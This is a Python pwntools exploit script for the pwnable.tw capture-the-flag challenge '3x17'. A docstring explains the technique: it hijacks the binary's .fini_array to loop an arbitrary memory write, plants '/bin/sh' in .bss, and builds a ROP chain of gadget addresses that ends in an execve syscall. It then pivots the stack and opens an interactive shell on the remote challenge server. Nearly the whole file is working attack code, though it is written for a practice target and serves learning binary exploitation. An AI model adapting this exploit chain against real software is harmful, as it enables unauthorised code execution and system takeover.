#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import time
from pwn import *
#context.log_level = 'debug'

elf = ELF('./3x17')

# Memory locations
fini_array      = 0x4b40f0
__libc_csu_fini = 0x402960
elf_main        = 0x401b6d
bin_sh          = elf.bss()

# Gadgets
leave_ret   = 0x401c4b
ret         = 0x401016
pop_rax_ret = 0x41e4af
pop_rdi_ret = 0x401696
pop_rsi_ret = 0x406c30
pop_rdx_ret = 0x446e35
syscall     = 0x4022b4

# Byte sequence alias
A8 = 8 * b'A'


def proc_write(proc, addr, data):
    proc.recvuntil('addr:')
    proc.send(str(addr).encode())
    proc.recvuntil('data:')
    proc.send(data)


def main():
    """
    Main idea: .fini_array hijacking + ROP

    0. In this challenge, all debugging symbols were not
       compiled into the ELF, so we have to find out the
       address of main() by ourselves.

       The entry point of the program is _start(). In gdb,
       we can run the command `starti` (exectue just 1 instruction
       and break immediately), and then we will be able to
       find out the address of main().

       What _start() does is simply invoke __libc_start_main().

       int __libc_start_main(int (*main)(int, char **, char **), # rdi
                             int argc,                           # rsi
                             char **ubp_av,                      # rdx
                             void (*init)(void),                 # rcx
                             void (*fini)(void),                 # r8
                             void (*rtld_fini)(void),            # r9
                             void (*stack_end));                 # $rbp + 16

    1. Hijack .fini_array and create a loop of arbitrary write:
       a) .fini_array[0] = __libc_csu_fini()
       b) .fini_array[1] = main()
       This will cause __libc_csu_fini() -> main() -> __libc_csu_fini() -> main()...
       Don't worry about the stack, it should be large enough :)

       Note: in main(), writing to arbitray memory address
       is allowed only if *0x4b9330 == 1, and since
       *0x4b9330 is a char (1 byte), we can simply let it run
       255 times and it will wrap around.

    2. To break the loop, overwrite .fini_array[0] to
       another function other than __libc_csu_fini().

    3. Stack pivoting:
       a) .fini_array[0 ] = `leave ; ret`
       b) .fini_array[1 ] = `ret`
       c) .fini_array[2:] = rop_chain

       where `leave` = `mov rsp, rbp` ; `pop rbp`

    External Reference:
    ---
    [1] http://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html
    [2] https://www.mdeditor.tw/pl/pxws
    """
    proc = remote('chall.pwnable.tw', 10105)
    #proc = elf.process()
    #log.debug('You may attatch this process to gdb now.')
    #raw_input()

    # 1. Create a loop of arbitrary write.
    proc_write(proc, fini_array, p64(__libc_csu_fini) + p64(elf_main))

    # 2. Write '/bin/sh\x00' to elf.bss()
    proc_write(proc, bin_sh, b'/bin/sh\x00')

    # 3. Write ROP chain (starting at .fini_array[2])
    payload  = p64(pop_rax_ret)  # ret
    payload += p64(59)           # rax = 59
    payload += p64(pop_rdi_ret)  # ret
    proc_write(proc, fini_array + 16, payload)

    payload  = p64(bin_sh)       # rdi = bin_sh
    payload += p64(pop_rsi_ret)  # ret
    payload += p64(0)            # rsi = 0
    proc_write(proc, fini_array + 40, payload)

    payload  = p64(pop_rdx_ret)  # ret
    payload += p64(0)            # rdx = 0
    payload += p64(syscall)      # ret
    proc_write(proc, fini_array + 64, payload)

    # 4. Stack pivot and execute ROP chain
    proc_write(proc, fini_array, p64(leave_ret) + p64(ret))
    proc.interactive()


if __name__ == '__main__':
    main()
